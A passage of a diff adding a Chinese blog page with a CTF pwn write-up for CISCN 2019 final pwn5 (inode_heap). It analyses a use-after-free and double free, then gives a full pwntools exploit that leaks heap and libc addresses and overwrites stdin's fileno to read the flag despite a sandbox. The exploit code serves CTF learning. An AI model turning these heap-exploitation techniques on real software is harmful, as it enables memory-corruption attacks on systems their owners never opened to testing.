:flag"</span>);</span><br><span class="line">    exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dup2(fd, <span class="number">666</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  setvbuf(stdout, <span class="number">0</span>LL, <span class="number">2</span>, <span class="number">0</span>LL);</span><br><span class="line">  setvbuf(stdin, <span class="number">0</span>LL, <span class="number">1</span>, <span class="number">0</span>LL);</span><br><span class="line">  setvbuf(stderr, <span class="number">0</span>LL, <span class="number">2</span>, <span class="number">0</span>LL);</span><br></pre></td></tr></table></figure></p>
+<p>然后调用Sandbox_Loading上了沙箱，禁用了execve.</p>
+<p>add函数只能申请两种大小chunk: 0x30和0x20</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>);</span><br><span class="line">v3 = get_atoi();</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">1</span> )                                <span class="comment">// int</span></span><br><span class="line">&#123;</span><br><span class="line">  int_pt = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !int_pt )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">bool</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your inode number:"</span>);</span><br><span class="line">  v0 = (<span class="keyword">int</span> *)int_pt;</span><br><span class="line">  *v0 = get_atoi();</span><br><span class="line">  *((_DWORD *)int_pt + <span class="number">2</span>) = *(_DWORD *)int_pt;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"add success !"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">2</span> )                                <span class="comment">// short int</span></span><br><span class="line">&#123;</span><br><span class="line">  short_pt = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !short_pt )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">bool</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your inode number:"</span>);</span><br><span class="line">  v1 = get_atoi();</span><br><span class="line">  *(_WORD *)short_pt = v1;</span><br><span class="line">  *((_WORD *)short_pt + <span class="number">4</span>) = *(_WORD *)short_pt;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"add success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>每次申请成功会把bool这个全局变量设置为1.<br>delete函数这里根据bool变量是否为1来决定是否free<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if ( <span class="keyword">bool </span>)</span><br><span class="line">&#123;</span><br><span class="line">  printf(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>)<span class="comment">;</span></span><br><span class="line">  <span class="built_in">v1</span> = get_atoi()<span class="comment">;</span></span><br><span class="line">  if ( <span class="built_in">v1</span> == <span class="number">1</span> &amp;&amp; int_pt )</span><br><span class="line">  &#123;</span><br><span class="line">    free(int_pt)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">bool </span>= <span class="number">0</span><span class="comment">;</span></span><br><span class="line">    puts(<span class="string">"remove success !"</span>)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  if ( <span class="built_in">v1</span> == <span class="number">2</span> &amp;&amp; <span class="keyword">short_pt </span>)</span><br><span class="line">  &#123;</span><br><span class="line">    free(<span class="keyword">short_pt);</span></span><br><span class="line"><span class="keyword"> </span>   <span class="keyword">bool </span>= <span class="number">0</span><span class="comment">;</span></span><br><span class="line">    puts(<span class="string">"remove success !"</span>)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"invalid !"</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>free过后没有将指针清0，存在UAF，虽然free过后就将bool变量设置为0，但是add一次过后会将bool变量设置为1，这样就可以一直free.<br>例如想要double free Int chunk，可以free一次，add一次Short Int chunk，这样就又可以free Int chunk了.</p>
+<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><p>首先在栈上写入属于unsorted bin 的size，然后利用double free申请到这个fake chunk.<br>连续free fake chunk 8次，将其放入unsorted bin 中.利用Show函数泄露出libc地址的高位4字节.<br>将chunk申请到stdin的fileno处，将fileno修改为666.<br>调用bye_bye函数，scanf就会将flag读入buf里，然后打印出来.</p>
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./inode_heap"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file,checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    argv = [<span class="string">"/glibc/x64/2.27/lib/ld-2.27.so"</span>,<span class="string">"--library-path"</span>,<span class="string">"/glibc/x64/2.27/lib/"</span>,<span class="string">"./inode_heap"</span>]</span><br><span class="line">    a=process(argv=argv)</span><br><span class="line">    libc=ELF(<span class="string">"/glibc/x64/2.27/lib/libc-2.27.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#text_base,libc_base=get_base(a)</span></span><br><span class="line">    <span class="comment">#script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'</span></span><br><span class="line">    script=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"which command?\n&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(type1,content)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>,str(type1))</span><br><span class="line">    a.sendafter(<span class="string">"your inode number:"</span>,str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x91</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x21</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x21</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">a.recvuntil(<span class="string">"your int type inode number :"</span>)</span><br><span class="line">heap_base=eval(a.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>))</span><br><span class="line">heap_base=struct.pack(<span class="string">"i"</span>,heap_base)</span><br><span class="line">heap_base=struct.unpack(<span class="string">"I"</span>,heap_base)[<span class="number">0</span>]</span><br><span class="line">fuck(heap_base)</span><br><span class="line">fake_chunk_addr=heap_base<span class="number">-0xe0</span></span><br><span class="line">add(<span class="number">1</span>,fake_chunk_addr)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)<span class="comment">#get fake chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x21</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena_96 = libc.symbols[<span class="string">"__malloc_hook"</span>]+<span class="number">0x10</span>+<span class="number">96</span></span><br><span class="line">a.recvuntil(<span class="string">"your int type inode number :"</span>)</span><br><span class="line">libc_base=eval(a.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>))</span><br><span class="line">libc_base=struct.pack(<span class="string">"i"</span>,libc_base)</span><br><span class="line">libc_base=struct.unpack(<span class="string">"I"</span>,libc_base)[<span class="number">0</span>]-main_arena_96</span><br><span class="line">fuck(libc_base)</span><br><span class="line">stdin = libc_base+libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">add(<span class="number">1</span>,stdin+<span class="number">112</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x21</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x21</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x21</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,fake_chunk_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">666</span>)</span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/02/ctf中pwn入门指南/" rel="next" title="ctf中pwn入门指南">
+                <i class="fa fa-chevron-left"></i> ctf中pwn入门指南
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/my.jpg" alt="ditto">
+            
+              <p class="site-author-name" itemprop="name">ditto</p>
+              <p class="site-description motion-element" itemprop="description">pwn for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Dittozzz" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ogeek-final-ovm"><span class="nav-number">1.</span> <span class="nav-text">Ogeek final ovm</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#字节码分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">字节码分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用思路"><span class="nav-number">1.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN-2019-final-day1-pwn5"><span class="nav-number">2.</span> <span class="nav-text">CISCN 2019 final day1 pwn5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序分析"><span class="nav-number">2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用思路-1"><span class="nav-number">2.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-1"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ditto</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">52.5k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
